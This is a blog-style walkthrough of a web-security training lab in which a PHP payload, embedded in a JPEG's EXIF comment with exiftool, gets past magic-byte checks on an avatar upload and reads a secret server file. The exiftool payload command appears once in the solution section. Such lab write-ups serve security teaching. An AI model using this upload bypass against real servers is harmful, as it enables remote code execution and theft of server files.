---
layout: post
title:  "Web shell upload via obfuscated file extension"
date:   2024-10-29 10:20:54 +0530
---

## Objective 

This lab contains a vulnerable image upload function. Although it checks the contents of the file to verify that it is a genuine image, it is still possible to upload and execute server-side code.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

## Solution 

Just like the other labs on what we saw, you can login as a wiener user and you can upload an avatar. But here, when we upload the image, the JPEG image is accepted. 

When we upload the exploit.php file, we have the exploit right which helps in getting the contents of the target content. That's it, when we uploaded, we didn't get what we expected but instead we faced an error. 

![]({{ site.baseurl }}/assets/images/fileupload/fu-16.png)

But when we upload a valid image, kind of like I have the JPEG image right now, so when we upload it, it accepts, but when we're inspecting the actual request, how it's passing through, we can find that there is certain magic byte being validated. Let's assume I have an image which is a PNG file that I converted into JPEG, but when inspecting, I can see that a magic byte called PNG exists in the data, which means it's identified as a PNG file, but the extension is a JPEG file.

![]({{ site.baseurl }}/assets/images/fileupload/fu-17.png)

So now, we found that there is a magic by validation being happening, right?

What we did is, through Exif tool, we got a sample image from Google, it's a valid JPEG image, and through the following Exif command, we are injecting the malicious PHP code into the JPEG image and generating a new PHP file through Exif. 

```bash
exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" exploit.jpg -o exploit2.php
```

This is how the new PHP file looks like - it properly validates the signatures in the headers and injects the malicious PHP code. 

![]({{ site.baseurl }}/assets/images/fileupload/fu-18.png)

And now, we've successfully bypassed the MagicBytes validation and uploaded the malicious PHP file. 

![]({{ site.baseurl }}/assets/images/fileupload/fu-19.png)

Now open the avatar in a new tab and on the top of it, you will find a secret code. Submit it as a solution that solves a lot. 

![]({{ site.baseurl }}/assets/images/fileupload/fu-20.png)